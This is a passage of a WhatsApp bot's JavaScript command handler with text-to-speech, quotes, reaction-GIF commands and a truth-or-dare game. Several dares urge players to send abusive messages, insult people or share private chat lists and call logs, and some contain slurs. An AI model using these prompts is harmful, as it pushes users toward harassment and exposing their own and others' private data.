                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
             
         }
     break
     case 'say': case 'tts': case 'gtts':{
if (!text) return replygcaespisp('Where is the text?')
            let texttts = text
            const aespisprl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return ArielStore.sendMessage(m.chat, {
                audio: {
                    url: aespisprl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${themeemoji} *Fact:* ${data.fact}\n`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
    }
    break
    case 'quotes':{
const quoteArielSP = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quoteArielSP.data.quote.body}\n\n*${themeemoji} Author:* ${quoteArielSP.data.quote.author}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: textquotes
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'truth': case 'dare': {
	bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease Choose The Button Below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Truth 🌝\",\"id\":\"${prefix}turut"}`
            },
{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Dare 🌚\",\"id\":\"${prefix}dere"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'dere':{
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner aespibotz through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const aespispdare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose DARE_\n'+ aespispdare
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
              break
                            break
       case 'turut':{
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, aespisp?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const aespisptruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose TRUTH_\n'+ aespisptruth
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
              break
              case 'hug': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/hug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} hugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cry': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cried themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cried @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kill': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kill`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} killed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} killed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'pat': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/pat`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} patted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} patted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'lick': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/lick`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} licked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} licked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kiss': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kiss`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} kissed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} kissed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bite': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bit themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bit @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'yeet': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/yeet`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} yeeted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} yeeted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bully': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bully`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bullied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bullied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bonk': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bonk`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bonked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bonked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wink': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wink`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} winked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} winked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'poke': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/poke`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} poked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} poked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'nom': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/nom`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} nommed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} nommed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'slap': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/slap`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} slapped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} slapped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

